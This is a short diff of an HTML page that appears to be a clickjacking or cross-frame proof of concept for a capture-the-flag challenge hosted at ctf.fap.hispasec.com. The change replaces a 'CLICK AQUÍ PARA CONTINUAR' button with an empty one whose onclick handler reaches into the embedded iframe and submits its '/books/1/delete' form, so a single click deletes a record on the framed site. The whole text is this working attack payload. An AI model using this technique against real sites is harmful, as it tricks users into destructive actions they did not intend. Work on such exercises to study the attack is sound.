@@ -40,7 +40,10 @@
 <body>
 
     <div class="wrapper">
-        <button id="objetivo">CLICK AQUÍ PARA CONTINUAR</button>
+        <button id="objetivo" 
+onclick="document.querySelector('iframe').contentWindow.document.querySelector('form[action=\"/books/1/delete\"]').submit();">
+</button>
+
 
         <iframe src="https://ctf.fap.hispasec.com:8018/books/1"></iframe>
     </div>
